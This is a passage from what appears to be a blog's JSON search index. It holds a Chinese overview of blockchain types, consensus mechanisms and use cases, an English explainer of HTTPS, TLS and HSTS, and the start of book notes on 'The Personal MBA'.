目前来看，共有链更容易吸引市场和媒体的眼球，但更多的商业价值会在联盟链和私有链上落地。\n公有链：是指世界上任何个体或者机构都可以发送交易，且交易能够获得该区块链的有效确认，任何人都可参与其共识过程，记账权完全由公开的共识算法决定，即整个网络是开放的。\n联盟链：顾名思义，一般是指由少数的机构组成联盟节点，进入和退出需要授权的区块链，联盟之间是有价值传输的，属于协作关系但同时又不能完全信任，典型的场景有跨境支付，票据市场，场外市场等等。 一般由PBFT一致性算法改造的共识算法，节点数不会太多，同时要求出块速度快，并且所有节点是需要准入的，也就是通过许可才能访问该联盟链（我们也称联盟链为许可链）。\n私有链：是完全被单独的个人或某个组织控制的区块链，仅仅使用区块链的分布式账本技术进行记账，与其他的分布式存储方案没有太大区别。\n公有链不适合大部分企业应用场景，未来企业应用的重点是联盟链，但现阶段关注的重点是公有链，公有链是区块链技术的试验田，会遇到各种复杂的情况和问题，是对新技术和新业务的测试，这对企业应用提供很好的借鉴。 对于区块链的去中心化、安全、高效这三个特性，符合蒙代尔不可能三角关系，即不可能同时满足三个条件。公有链实现了完全的去中心化和安全，因此在性能上就很低，联盟链为了企业应用，提高了性能和安全，就不得不在去中心化上进行妥协，通过一个中心化的授权方式来管理节点，实现了半中心化。\n根据使用目的和场景不同，又可以分为货币链，记录产权为目的的产权链，以众筹为目的的众筹链等，也有不局限特定应用场景的通用链。 现有大部分区块链实现都至少包括了网络层，共识层，智能合约和应用层等结构，联盟链实现往往还会引入一定的权限管理机制。\n区块链2.0 区块链2.0的典型代表是以太坊（Ethereum）和超级账本（Hyperledger），分别代表了区块链的两个重要的发展方向：应用于公众的公有链和应用于企业的联盟链。 Hyperledger项目是首个面向企业应用场景的开源分布式账本平台。 主打联盟链，Linux基金会项目。 面向不同目的和场景的子项目组成： Fabric, Sawtooth, Iroha, Blockchain Explorer, Cello, Indy, Composer, Burrow\n区块链1.0被称之为“全球账簿”。相应的，区块链2.0可以被看作一台“全球计算机”：实现了区块链系统的图灵完备，可以在区块链上传和执行应用程序，并且程序的有效执行能得到保证，在此基础上实现了智能合约的功能。\n相对于区块链1.0，区块链2.0有如下优势：\n支持智能合约: 区块链2.0定位于应用平台，在这个平台上，可以发布各种智能合约，并能与其它外部IT系统进行数据交互和处理，从而实现各种行业应用。 适应大部分应用场景的交易速度: 通过采用PBFT、POS、DPOS等新的共识算法，区块链2.0的交易速度有了很大的提高，峰值速度已经超过了3000TPS（每秒处理交易数量），远远高于比特币的5TPS，已经能够满足大部分的金融应用场景。 支持信息加密: 区块链2.0因为支持完整的程序运行，可以通过智能合约对发送和接收的信息进行自定义加密和解密，从而达到保护企业和用户隐私的目的，同时零知识证明等先进密码学技术的应用进一步推动了其隐私性的发展。 无资源消耗: 为了维护网络共识，比特币使用的算力超122029 TH/s，相当于5000台天河2号A运算速度，每天耗电超过2000MWh，约合几十万人民币（估测数据）。区块链2.0采用PBFT、DPOS、POS等新的共识算法，不再需要通过消耗算力达成共识，从而实现对资源的零消耗，使其能绿色安全的部署于企业信息中心。 区块链本质 认识上的误区\n区块链不等于比特币 区块链不等于数据库：虽然区块链也可以用来存储数据，但它要解决的核心问题是多方的互信问题。单纯从存储数据角度，它的效率可能不高，也不推荐把大量的原始数据放到区块链系统上。当然，现在已有的区块链系统中，数据库相关的技术十分关键，直接决定了区块链系统的吞吐性能 区块链并非一门万能的颠覆性技术 区块链自身维护着一个按时间顺序持续增长、不可篡改的数据记录，当现实或数字世界中的资产可以生成数字摘要时，区块链遍成为确权类应用的完美载体，提供包含所属权和时间戳的数字证据。 可编程的智能合约使得在区块链上登记的资产可以获得在现实世界中难以提供的流动性，并能够保证合约规则的透明和不可篡改。 这就为区块链上诞生更多创新的经济活动提供了土壤，为社会资源价值提供更加高效且安全的流动渠道。\n此外，还需要思考区块链解决方案的合理边界。 面向大众消费者的区块链应用需要做到公开、透明、可审计，即可以部署在无边界的共有链，也可以部署在应用生态内多中心节点共同维护的区块链； 面向企业内部或多个企业间的商业区块链场景，则可将区块链的维护节点和可见性限制在联盟内部，并用智能合约重点解决联盟成员间的信任或信息不对等问题，以提高经济活动的效率。\n从技术角度来看，这是一个牺牲一致性效率且保证最终一致性的的分布式的数据库。 从经济学的角度来看，这种容错能力很强的点对点网络，恰恰满足了共享经济的一个必须要求：低成本的可信环境。\n区块链应用场景 传统交易 自有人类社会以来，金融交易就是必不可少的经济活动，涉及货币、证券、抵押，捐赠等诸多行业。 交易角色和交易功能的不同，反映出不同的生产关系。 通过交易，可以优化社会运转效率，实现资源价值的最大化。 可以说，人类社会的文明发展离不开交易形式的演变。\n传统交易本质上交换的是物品价值的所属权。 为了完成一些贵重商品的交易（例如房屋、车辆的所属权），往往需要十分繁琐的中间环节，同时需要中介和担保机构参与其中。 这是因为，交易双方往往存在着不能充分互信的情况。\n一方面，要证实合法的价值所属权并不简单，往往需要开具各种证明材料，存在造假的可能；另一方面，价值不能直接进行交换，同样需要繁琐的手续，在这个过程中存在较多的篡改风险。 为了确保金融交易的可靠完成，出现了中介和担保机构这样的经济角色。 它们通过提供信任保障服务，提高了社会经济活动的效率。 但现有的第三方中介机制往往存在成本高、时间周期长、流程复杂、容易出错等缺点。 金融领域长期存在提高交易效率的迫切需求。 区块链技术可以为金融服务提供有效、可信的所属权证明，以及相当可靠的合约确保机制。\n比如我和A赌NBA总冠军，我说是勇士，A说是骑士。但是A的赌品我深表怀疑，担心他输了赖账不给钱。 没想到A反咬一口，还怀疑我的赌品不好，简直岂有此理！那咱俩就需要一个可信第三方来做公证人。 我们可以各自出20块钱给我们都信得过的公证人来保管。如果届时勇士赢了，40块钱就归我。如果骑士赢了，40块钱就归A。 总决赛系列终于结束了，公证人卷了巨款40元跑了……\n出于对人性堕落的失望，我和A决定使用区块链技术来解决这个价值40块钱真金白银的问题。 办法是写一个”智能合约“来实现对赌。方法是这样的，我们先各自出20块钱打到一个”智能合约“的账户里，这个合约不被任何人控制，只被合约的代码控制。 现在”智能合约“的账户上有了40块钱，我们开始运行智能合约。\n这个叫做”智能合约账号“的账户，事实上是一个无人信托，它只会按照代码去执行。\n中间人浪费： 保费里的很小一部分是真正发挥作用的，比如说如果旅行保险用智能合约来实现的话，就会如以下：\n1航班抵达时间=航空公司官网.get(航班号) 2\tpay 30 to I 3\tif(航班抵达时间-预期时间\u0026gt;3小时） 4pay 1000 to C 未来几年内，可能深入应用区块链技术的场景将包括：\n金融服务：区块链带来的潜在优势包括降低交易成本、减少跨组织交易风险等。该领域的区块链应用目前最受关注，全球不少银行和金融交易机构都是主力推动者。部分投资机构也在应用区块链技术降低管理成本和管控风险。从另一方面，要注意可能引发的问题和风险。例如DAO这样的众筹实验，提醒应用者在业务和运营层面都要谨慎处理 征信和权属管理：征信和权属的数字化管理是大型社交平台和保险公司都梦寐以求的。目前该领域的主要技术问题包括缺乏足够的数据和分析能力；缺乏可靠的平台支持以及有效的数据整合管理等。区块链被认为可以促进数据交易和流动，提供安全可靠的支持。征信行业的门槛比较高，需要多方资源共同推动 资源共享：以Airbnb为代表的分享经济公司将欢迎去中心化应用，可以降低管理成本。该领域主题相对集中，设计空间大，受到大量的投资关注 贸易管理：区块链技术可以帮助自动化国际贸易和物流供应链领域中繁琐的手续和流程。基于区块链设计的贸易管理方案会为参与的多方企业带来极大的便利。另外，贸易中销售和法律合同的数字化、货物监控与检测、实时支付等方向都可能成为创业公司的突破口 物联网：物联网也是很适合应用区块链技术的一个领域，预计未来几年会有大量应用出现，特别是租赁、物流等特定场景，都是很适合区块链技术的场景。但目前阶段，物联网自身的技术局限将造成短期内不会出现大规模应用。 选举: 大家的投票“绝不可能被我们——即程序员，学校管理员或学生修改、删除。” 金融服务 类似‘一路一带’这样创新的投资建设模式，会碰到来自地域、货币、信任等各方面的挑战。 现在已经有一些参与到一路一带中的部门，对区块链技术进行探索应用。 区块链技术可以让原先无法的交易的双方（例如，不存在多方都认可的国际货币储备的情况下）顺利完成交易，并且降低贸易风险、减少流程管控的成本。\n供应链金融也是区块链技术应用得比较多的一个领域。\n放贷方要知道有没有真实上下游的交易，应收确权等等。 谁都别信谁，上区块链，上下游把自己有没有发货有没有应付写上去。 谁都别想赖账，明明白白的公开账本。 放贷方就能做风险控制了。\n征信管理 征信管理是一个巨大的潜在市场，据称超过千亿规模，也是目前大数据应用领域最有前途的方向之一。 目前，与征信相关的大量有效数据集中在少数机构手中。\n由于这些数据太过敏感，并且具备极高的商业价值，往往会被严密保护起来，形成很高的行业门槛。 虽然现在大量的互联网企业（包括各类社交网站）尝试从各种维度获取了海量的用户信息，但从征信角度看，这些数据仍然存在若干问题。\n这些问题主要包括：\n数据量不足：数据量大，能获得的价值自然越高，数据量过少则无法产生有效的价值 相关度较差：最核心的数据也往往是最敏感的。在隐私高度敏感的今天，用户都不希望暴露过多数据给第三方，因此企业获取到的数据中有效成分往往很少。 时效性不足：企业可以从明面上获取到的用户数据往往是过时的，甚至存在虚假信息，对相关分析的可信度造成严重干扰 区块链天然存在无法篡改、不可抵赖的特性。 同时，区块链平台将可能提供前所未有的相关性极高的数据，这些数据可以在时空中准确定位，并严格关联到用户。\n因此，基于区块链提供数据进行征信管理，将大大提高信用评估的准确率，同时降低评估成本。 另外，跟传统依靠人工的审核过程不同，区块链中交易处理完全遵循约定的自动化执行。 基于区块链的信用机制将天然具备稳定性和中立性。\n权属管理 区块链技术可以用于产权、版权等所有权的管理和追踪。 其中包括汽车、房屋、艺术品等各种贵重物品的交易等，也包括数字出版物，以及可以标记的数字资源。 目前权属管理领域存在的几个难题是：\n所有权的确认和管理 交易的安全性和可靠性保障 必要的隐私保护机制 以房屋交易为例。买卖双方往往需要依托中介机构来确保交易的进行，并通过纸质的材料证明房屋所有权。 但实际上，很多时候中介机构也无法确保交易的正常进行。 而利用区块链技术，物品的所有权是写在数字链上的，谁都无法修改。 并且一旦出现合同中约定情况，区块链技术将确保合同能得到准确执行。 这能有效减少传统情况下纠纷仲裁环节的人工干预和执行成本。\n物联网 物联网是大数据时代的基础。 区块链技术是物联网时代的基础。\n一种可能的应用场景：物联网中每一个设备分配地址，给该地址关联一个账户，用户通过向账户中支付费用可以租借设备，以执行相关动作，从而达到租借物联网的应用。 典型的应用包括PM2.5监测点的数据获取、温度检测服务、服务器租赁、网络摄像头数据调用，等等。\n另外，随着物联网设备的增多，边沿计算需求的增强，大量设备之间形成分布式自组织的管理模式，并且对容错性要求很高。 区块链技术所具备的分布式和抗攻击特点可以很好地融合到这一场景中。\n公共网络服务 现有的互联网能正常运行，离不开很多近乎免费的网络服务，例如域名服务（DNS）。 任何人都可以免费查询到域名，没有DNS，现在的各种网站将无法访问。 因此，对于网络系统来说，类似的基础服务必须要能做到安全可靠，并且低成本。\n区块链技术恰好具备这些特点，基于区块链打造的分布式DNS系统，将减少错误的记录和查询，并且可以更加稳定可靠地提供服务。\n保险业应用 综合来说，区块链是一种可以制造信用的技术，它能够让毫无任何关系的节点互相信任，并达成共识，而不需要任何权威机构作为中介进行背书，通过智能合约处理各种事务，减少了人为干预的风险，这种新的技术特点，可以应用于很多金融领域，比如：\n跨境支付与结算：实现点到点交易，减少中间费用； 证券发行与交易：实现准实时资产转移，加速交易清算速度； 客户征信与反欺诈：降低法律合规成本，防止金融犯罪。 互助保险又叫相互保险，指具有同样风险保障需求的人所组成的，不以牟利为目的，以互相帮助为原则，实行“共享收益，共摊风险”的保险形式。 相互保险与商业保险最大的不同是商业保险的承保人是公司，其利益与客户对立，而互助保险的承保人是每个参与者，实现了保险人和被保险人的身份合一。\n互助保险已经存在很长的历史，从全球互助保险的实践来看，大多数都是从互助的初衷出发，但因为缺乏一个可操作的信任体系，落入了公司陷阱，导致互助保险组织越做越像一家保险公司，甚至很多最终转为公司。 区块链技术构成了一个信息对称、透明、不可篡改的信任网络，使得点对点的区块链互助保险能够建立信息安全和参与者之间的互信体系，并通过智能合约实现民主决策和组织规则准确无误的执行，最终实现组织结构扁平化，降低运营成本，降低互助保障成本，真正形成一个人人为我，我为人人的保险互助形式。\n近年来金融企业集团化趋势越来越明显，保险企业集团化不但有利于集中统一管理各项资金，实现投资专业化管理，取得投资规模效益，还有利于增强专业子公司的抗风险能力，提高规模竞争的优势。\n区块链的技术 智能合约 智能合约又称智能合同，是由事件驱动的、具有状态的、获得多方承认的、运行在区块链之上的、且能够根据预设条件自动处理资产的程序，智能合约最大的优势是利用程序算法替代人仲裁和执行合同。 本质上讲，智能合约也是一段程序，但是与传统的IT系统不同，智能合约继承了区块链的三个特性：数据透明、不可篡改、永久运行。\n数据透明: 区块链上所有的数据都是公开透明的，因此智能合约的数据处理也是公开透明的，运行时任何一方都可以查看其代码和数据。 不可篡改: 区块链本身的所有数据不可篡改，因此部署在区块链上的智能合约代码以及运行产生的数据输出也是不可篡改的，运行智能合约的节点不必担心其他节点恶意修改代码与数据。 永久运行: 支撑区块链网络的节点往往达到数百甚至上千，部分节点的失效并不会导致智能合约的停止，其可靠性理论上接近于永久运行，这样就保证了智能合约能像纸质合同一样每时每刻都有效。 数字证书 对于非对称加密算法和数字签名来说，很重要的一点就是公钥的分发。 理论上任何人可以公开获取到对方的公钥。 然而这个公钥有没有可能是伪造的呢？传输过程中有没有可能被篡改掉呢？ 一旦公钥出了问题，则建立在其上的安全体系的安全性将不复存在。\n数字证书机制正是为了解决这个问题，它就像日常生活中的证书一样，可以证明所记录信息的合法性。 比如证明某个公钥是某个实体（如组织或个人）的，并且确保一旦内容被篡改能被探测出来，从而实现对用户公钥的安全分发。\n根据所保护公钥的用途，可以分为加密数字证书（Encryption Certificate）和签名验证数字证书（Signature Certificate）。 前者往往用于保护加密信息的公钥；后者则保护用于进行解密签名进行身份验证的公钥。 两种类型的公钥也可以同时放在同一证书中。\n一般情况下，证书需要由证书认证机构（Certification Authority, CA）来进行签发和背书。 权威的证书认证机构包括DigiCert, GlobalSign, VeriSign等。 用户也可以自行搭建其他CA系统，在私有网络中进行使用。\n业务合约和账本 在现实世界，我们每个人都处在各种关系契约中，所有人在契约的约定下参与整个社会的生产和生活。 区块链技术最终要能促进生产关系虚拟化，推动生产力的发展，整个区块链生态系统的核心就是要能支持各种契约，即业务合约，并在相关参与者间共享交易账本。\n业务合约大到非常复杂的业务合约流程，这要高于企业各自的流程，是各个企业、组织或个人作为流程主体共同参与制定共同认可的生产关系流程契约。 比业务合约流程粒度小的业务合约称为合约服务，合约服务是在语义层面对业务行为进行抽象的最小契约，合约服务由一组合约动作（action）构成。 作为抽象的合约服务的具体实现，合约代码可以由不同合约语言编写，合约代码中引用的业务条款和法律条款也都可以有具体的不同实现语言。\n合约流程实现了基于合约服务的一系列固定的，按照既定业务规则和法律条款串联或并联起来的合约动作，通过各个合约动作的完成，实现业务在各个流程参与方的执行，实现由机器流程引擎驱动的价值高速自动创造，自动流转，自动交换。 合约流程一旦运行起来就是一个状态机，合约流程在参与方间共享流程状态，也就是共享一致的状态机的状态。\n区块链一个大的应用方向就是同物联网的结合，物联网的各种终端要实现智能化自动制造，智能化自主服务，就需要将他们绑定到虚拟世界里，传统的IoT中心化控制架构是无法直接反应社会化生产和服务要求的。 区块链作为一个虚拟的经济社会，维持了虚拟的经济生产关系，让IoT智能终端参与区块链群体中，参与到具体的区块链合约流程和合约服务中，由社会化的区块链机器自动驱动IoT终端进行自动化的生产和服务，并引入人工智能代理加速人工处理，可以极大提高生产力。 区块链需要同IoT的协议进行适配，以确保双向交易的无障碍流通。 另外，为了在虚拟世界建模现实世界的价值生产，转移和交换，将现实世界真正融入到虚拟世界的生产关系合约中，需要为现实世界生产的产品和服务价值，在虚拟社会分配一个价值锚定标签，就如同虚拟世界拥有了私钥就可以锁定价值一样，在现实世界，也需要有一套可行的方案将虚拟世界的价值锚定标签植入到现实世界的产品和服务中去，不同的产品和服务可能需要不同的锚定机制。 通过价值锚定标签，现实世界价值的生产、转移和交换就可以无缝融合进虚拟世界的生产关系合约流程和服务中去。\n共识机制（consensus process ) 在去中心化以后，整个系统中没有了权威的中心化代理，信息的可信度和准确性便会面临问题。\n两将军问题 （Two Generals Paradox）：两个将军要通过信使来达成进攻还是撤退的约定，但信使可能迷路或被敌军阻拦（消息丢失或伪造），如何达成一致？在分布式系统上，试图在异步系统和不可靠的通道上达成一致性是不可能的 拜占庭将军问题（Byzantine Generals Problem）:\t拜占庭罗马帝国在军事行动中，采取将军投票的策略来决定是进攻还是撤退，也就是说如果多数人决定进攻，就上去干。但是军队中如果有奸细（比如将军已经反水故意乱投票，或者传令官叛变擅自修改军令），那怎么保证最后投票的结果真正反映了忠诚的将军的意愿呢？拜占庭将军问题反映到信息交换领域中来，可以理解为在一个去中心的系统中，有一些节点是坏掉的，它们可能向外界广播错误的信息或者不广播信息，在这种情况下如何验证数据传输的准确性。 区块链是一个放在非安全环境中的分布式数据库（系统）。 比特币共识是最长链共识，也就是说最长链--\u0026gt;大多数--\u0026gt;理性，于是分叉是允许的。\n权益证明（Proof of Stake） 类似于现实生活中的股东机制，拥有股份越多的人越容易获取记账权（同时越倾向于维护网络的正常工作）\n典型的过程是通过保证金（代币，资产，名声的具备价值属性的物品即可）来对赌一个合法的块成为新的区块，收益为抵押资本的利息和交易服务费。 提供证明的保证金（例如通过转账货币记录）越多，则获得记账权的概率就越大。 合法记账者可以获得收益。\nPoS试图解决在PoW中大量资源被浪费的缺点，受到了广泛关注。 恶意参与者将存在保证金被罚没的风险，即损失经济利益。\n一般情况下，对于PoS来说，需要掌握超过全网1/3的资源，才有可能左右最终的结果。 这也很容易理解：三个人投票，前两个人分别支持一方，这时第三方的投票将决定最终结果。\nPoS也有一些改进的算法，包括授权股权证明机制（DPoS），即股东们投票选出一个董事会，董事会成员才有权进行代理记账。\n区块链是在符合现实社会法律法规前提下，可治理的，依赖于密码学算法和博弈经济性设计，基于共识算法，对发生在主体间的价值创造，价值转移，价值交换，以及涉及到各个价值主体由机器驱动的业务流程，在多个对等的主体间形成的共识，从而达到共享业务状态，共享价值状态，即共享账本，以达到加速社会资源配置和价值流通，最终提高生产力的目的。\n区块链的本质是共识，在互不信任的主体间的共识就形成了公认的价值。区块链的目标是解放和提高整个社会的生产力，手段是将生产关系虚拟化，运用IoT和价值锚定技术将现实世界和虚拟世界无缝连接起来，虚拟化的业务合约可以由机器自动化驱动现实和虚拟社会的资源配置，价值生产和流通，结合大数据智能分析优化虚拟的生产关系，现实和虚拟的法律法规和治理机制为虚拟的区块链社会的稳定发展提供保障。\n分叉 如果两个节点同时宣称挖到了矿，如何处理\n区块链世界引入了一条新的规则——拥有最多区块的支链将是真正被认可有价值的，较短的支链将会被直接Kill掉。\n双花和51%攻击 假设有一个名叫X-Man的坏家伙，他控制了一个计算机节点，这个节点拥有比地球上任何一个节点算力都强大的计算机集群。 首先，X-Man事先创造了一条独立的（不去广而告之）、含有比较多区块的链条。其中一个区块里放着“X-Man转账给X-Man 1000元”的纸条。 接着，X-Man跟张三购买了一部手机，他在小纸条上记录下“X-Man转账给张三1000元”；这条信息被三次确认后（即三个区块被真实挖出、校验和连接），然后，张三把手机给了X-Man。 X-Man拿到手机之后，按下机房的开关，试图将先前已经创造的区块链条连接在自己这个节点区块链的末尾。 大功告成，X-Man拥有了一条更长的区块链条，那些较短、存放着“X-Man转账给张三1000元”的区块链，以及在区块链世界里那则真实转账行为被一同成功销毁。 这个不可能成功，因为更长链意味着需要更强的算力，无法让之前的block失效。 除非你控制着全球51%的算力，这也就是区块链世界里另外一个著名的概念，叫做“51%攻击”。 现实生活中不大会存在，因为成本过高，高于挖矿收入。\n挖矿收入 矿工节点的收益主要由两部分组成：1）挖出新区块的奖励；2）挖出新区块内所含交易的交易费。\n但就目前来说，一个区块内的交易费大概只占到矿工总收入的0.5%甚至更少，大部分收益主要还是来自于挖矿所得的比特币奖励。 然而，随着挖矿奖励的递减，以及每个区块中包含的交易数量增加，交易费在矿工收益中所占的比重将会逐渐增加。 在2140年之后，所有的矿工收益将完全由交易费构成。\n区块链的架构 区块链2.0采用五层架构，从下到上分别是数据层、网络层、共识层、激励层、智能合约层。\n数据层 数据层最底层的技术，是一切的基础，主要实现了两个功能，一个是相关数据的存储，另一个是账户和交易的实现与安全。 数据存储主要基于Merkle树，通过区块的方式和链式结构实现，大多以KV数据库的方式实现持久化，比如以太坊采用leveldb。 帐号和交易的实现基于数字签名、哈希函数和非对称加密技术等多种密码学算法和技术，保证了交易在去中心化的情况下能够安全的进行。\n网络层 网络层主要实现网络节点的连接和通讯，又称点对点技术，是没有中心服务器、依靠用户群交换信息的互联网体系。 与有中心服务器的中央网络系统不同，对等网络的每个用户端既是一个节点，也有服务器的功能，其具有去中心化与健壮性等特点。\n共识层 共识层主要实现全网所有节点对交易和数据达成一致，防范拜占庭攻击、女巫攻击、51%攻击等共识攻击，其算法称为共识机制，因为其应用场景不同，区块链2.0出现了多种富有特色的共识机制。\nPoS：Proof of Stake，权益证明。原理：节点获得区块奖励的概率与该节点持有的代币数量和时间成正比，在获取区块奖励后，该节点的代币持有时间清零，重新计算。但由于代币在初期分配时人为因素过高，容易导致后期贫富差距过大。 DPoS：Delegate Proof of Stake，股份授权证明。原理：所有的节点投票选出100个（或其他数量）委托节点，区块完全由这100个委托节点按照一定算法生成，类似于美国的议会制。 Casper：投注共识。原理：以太坊下一代的共识机制，每个参与共识的节点都要支付一定的押金，节点获取奖励的概率和押金成正比，如果有节点作恶押金则要被扣掉。 PBFT：Practical Byzantine Fault Tolerance，拜占庭容错算法。原理：与一般公有链的共识机制主要基于经济博弈原理不同，PBFT基于异步网络环境下的状态机副本复制协议，本质上是由数学算法实现了共识，因此区块的确认不需要像公有链一样在若干区块之后才安全，可以实现出块即确认。 PoET：Proof of Elapsed Time，消逝时间量证明。原理：该共识机制由Intel提出，核心是用Intel支持SGX技术的CPU硬件，在受控安全环境（TEE）下随机产生一些延时，同时CPU从硬件级别证明延时的可信性，类似于彩票算法，谁的延时最低，谁将获取记账权。这样，增加记账权的唯一方法就是多增加CPU的数量，具备了当初中本聪设想的一个CPU一票的可能，同时增加的CPU会提升整个系统的资源，变相实现了记账权与提供资源之间的正比例关系。 共识机制有各自的优缺点，适应不同的场景，进行对比\n激励层 激励层主要实现区块链代币的发行和分配机制，比如以太坊，定位以太币为平台运行的燃料，可以通过挖矿获得，每挖到一个区块固定奖励5个以太币，同时运行智能合约和发送交易都需要向矿工支付一定的以太币。\n智能合约层 智能合约赋予账本可编程的特性，区块链2.0通过虚拟机的方式运行代码实现智能合约的功能，比如以太坊的以太坊虚拟机（EVM）。 同时，这一层通过在智能合约上添加能够与用户交互的前台界面，形成去中心化的应用（DAPP）。\nWritten by Binwei@Shanghai\n","link":"http://localhost:1313/post/2018/blockchain_scenario/","section":"post","tags":["security","blockchain"],"title":"Blockchain Scenario"},{"body":"Https Explainations Published: Jan 24, 2018 Tags: security Category: ComputerScience\nHypertext Transfer Protocol Secure (HTTPS) is a safer version of HTTP, which is the communications protocol of the World Wide Web. An HTTPS session is encrypted using either the SSL protocol (Secure Socket Layer) or TLS protocol (Transport Layer Security) and offers protection against \u0026quot;eavesdropping\u0026quot; and that any change in the transmitted data.\nTable of Contents Introduction First Man in the middle attack in Chinese history. From \u0026quot;资治通鉴\u0026quot;:\n春，黑山贼帅张燕与公孙续率兵十万，三道救之。 未至，瓒密使行人赍书告续，使引五千铁骑于北隰之中，起火为应，瓒欲自内出战。 绍候得其书，如期举火。 瓒以为救至，遂出战。 绍设伏击之，瓒大败，复还自守。\nMan in the middle attack will cause a lot of damage.\nIn the web/cloud world, typical \u0026quot;Man in the middle Insertion\u0026quot; points can be the following options:\nBrowser Wireless Router ISP Web Server SSL: Secure Sockets Layer TLS: Transport Layer Security\nSSL and TLS are both cryptographic protocols that provide authentication and data encryption between servers, machines and applications operating over a network. SSL is the predecessor to TLS.\nTechnical Details TLS handshake The client sends a \u0026quot;Client hello\u0026quot; message to the server, along with the client's random value and supported cipher suites. The server responds by sending a \u0026quot;Server hello\u0026quot; message to the client, along with the server's random value. The server sends its certificate to the client for authentication and may request a certificate from the client. The server sends the \u0026quot;Server hello done\u0026quot; message. If the server has requested a certificate from the client, the client sends it. The client creates a random Pre-Master Secret and encrypts it with the public key from the server's certificate, sending the encrypted Pre-Master Secret to the server. The server receives the Pre-Master Secret. The server and client each generate the Master Secret and session keys based on the Pre-Master Secret. The client sends \u0026quot;Change cipher spec\u0026quot; notification to server to indicate that the client will start using the new session keys for hashing and encrypting messages. Client also sends \u0026quot;Client finished\u0026quot; message. Server receives \u0026quot;Change cipher spec\u0026quot; and switches its record layer security state to symmetric encryption using the session keys. Server sends \u0026quot;Server finished\u0026quot; message to the client. Client and server can now exchange application data over the secured channel they have established. All messages sent from client to server and from server to client are encrypted using session key. Redirect to HTTPS If your web site upgrade to https from http, you can do Redirecting to https:\nClient send http request Server return HTTP 301 (Moved Permanently) Client starts https request However, redirecting model has \u0026quot;Man in the middle\u0026quot; risk, not safe.\nStrict Transport Security A safer way is to use HTTP strict transport security (HSTS). Force all the http requests converted into https, including CSS, Javascript, fonts, images, favicon, media, etc.\nYou will not see 301 response, but the following content in the header:\n1Strict-Transport-Security: 2max-age=15552000; Go to HTTP site again, and you will get response 307 (Temporary Redirect).\nIf there is Man in the middle attack, client may never receive response 307. A even safer way is to make reloaded.\n1strict-transport-security: max-age=31536000; includeSubDomain;preload The relevant website is: https://hstspreload.org/\nMixed Content If your page contains unsecure resource, e.g. images, videos in iframe, https is not impleted correctly.\nIf you just use //www.resourceaddress in your code, then it will 'inherit' the parent scheme when get the resource.\nAlternative solution is to use Content Security Policy (CSP).\nContent Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context.\nExtended validation certificate An Extended Validation Certificate (EV) is a certificate used for HTTPS websites and software that proves the legal entity controlling the website or software package. Obtaining an EV certificate requires verification of the requesting entity's identity by a certificate authority (CA).\nCertificate When a web server is set up to accept https connections, the administrator must create a digital certificate for the web server. This certificate must then be signed by a certificate authority. This proves that the certificate owner is really the entity it states to be. Browsers are generally distributed with the signing certificates of known certificate authorities in order to verify that the certificates were really signed by them.\nDowngrade communication protocol One possible attack of https will be the client try to downgrade the communication version. Client claims it only has lower TLS version, and force the communication to be on lower version. Then use the opportunity to attack with the known vulnerabilities.\nTools relevant PowerShell cmlet New-SelfSignedCertificate, Export-PfxCertificate can generate certificate locally (pfx file)\nTo be used for release signing, a Software Publisher Certificate (SPC), and its private and public keys, must be stored in a Personal Information Exchange (.pfx) file. However, some certificate authorities (CAs) use different file formats to store this data. For example, some CAs store the certificate's private key in a Private Key (.pvk) file and store the certificate and public key in a .spc or .cer file.\nFiddler Port 443 is the default port for https.\nBy default, Fiddler can monitor http very well, but not https. Fiddler almost can see no communication if visit https websites.\nCheck on the following options in Fiddler can see the https communication: HTTPS tab, Decrypt HTTPS traffic. What Fiddler will do is a man in the middle attack on the machine.\nChrome Press F12 -\u0026gt; Application tab -\u0026gt; Cookies. Secure cookie cannot be get if it is on http channel.\nPress F12 and goto Security tab, you can see the certificates of the https web site.\nCertmgr certmgr.msc, to see the trusted CA (Firefox has its own CA manager)\nRelevant websites https://badssl.com/ Web page to see the browser for various features: http://caniuse.com You can see https is faster to load: httpvshttps.com. F12 -\u0026gt; Network -\u0026gt; Waterfall, the reason is https allows streaming content come all together. Certificate is not free. But you can use Let's encrypt: letsencrypt.org certbot.eff.org can automate the certificate process Cloudflare: Can handle https for you easier. Test how well you implement ssl: www.ssllabs.com HTTPS improves SEO: https://webmasters.googleblog.com/2014/08/https-as-ranking-signal.html Written by Binwei@Oslo\n","link":"http://localhost:1313/post/2018/https/","section":"post","tags":["security"],"title":"Https Explainations"},{"body":"The Personal MBA Published: Jan 22, 2018 Tags: booknotes Category: Management\nThis blog contains the booknotes of the book \u0026quot;The Personal MBA\u0026quot;.\nTable of Contents How to Learn One of the beautiful things about learning any subject is the fact that you don't need to know everything. You only need to understand a few critically important concepts that provide most of the value.\nWhen you first start to study a field, it seems like you have to memorize a zillion things. You don't. What you need is to identify the core principles - generally three to twelve of them - that govern the field. The million things you thought you had to memorize are simply various combinations of the core principles. Business Processes Roughly defined, a business is a repeatable process that:\nCreates and delivers something of value That other people want or need At a price they're willing to pay In a way that satisfies the customer's needs and expectations So that the business brings in enough profit to make it worthwhile for the owners to continue operation +----------------+---------------------------------------+--------------------------------------------+ | Processes | Definition | KPI | +----------------+---------------------------------------+--------------------------------------------+ | Value creation | Discovering what people need or want, | How quickly is the system creating value? | | | then creating it | What is the current level of inflows? | +----------------+---------------------------------------+--------------------------------------------+ | Marketing | Attracting attention and building | How many people are paying attention to | | | demand for what you've created | your offer? How many prospects are giving | | | | you permission to provide more information?| +----------------+---------------------------------------+--------------------------------------------+ | Sales | Tuning prospective customers into | How many prospects are becoming paying | | | paying customers | customers? What is the average customer's | | | | lifetime value? | +----------------+---------------------------------------+--------------------------------------------+ | Value delivery | Giving your customers what you've | How quickly can you serve each customer? | | | promised and ensuring that they're | What is your current returns or complaints | | | satisfied | rate? | +----------------+---------------------------------------+--------------------------------------------+ | Finance | Bringing in enough money to keep going| What is your profit margin? | | | and make your effort worthwhile | How much purchasing power do you have | | | | financially sufficient? | +----------------+---------------------------------------+--------------------------------------------+\nProcess improvements are easy to skip if you want the business's short-term profit number to look good, even though they're essential to long term viability.\nValue creation Assuming the promised benefits of the offering are appealing, there are nine common Economic Values that people typically consider when evaluating a potential purchase.\n+-----------------+----------------------------------------------------------+ | Efficacy | How well does it work? | +-----------------+----------------------------------------------------------+ | Speed | How quickly does it work? | +-----------------+----------------------------------------------------------+ | Reliability | Can I depend on it to do what I want? | +-----------------+----------------------------------------------------------+ | Ease of use | How much effort does it require? | +-----------------+----------------------------------------------------------+ | Flexibility | How many things does it 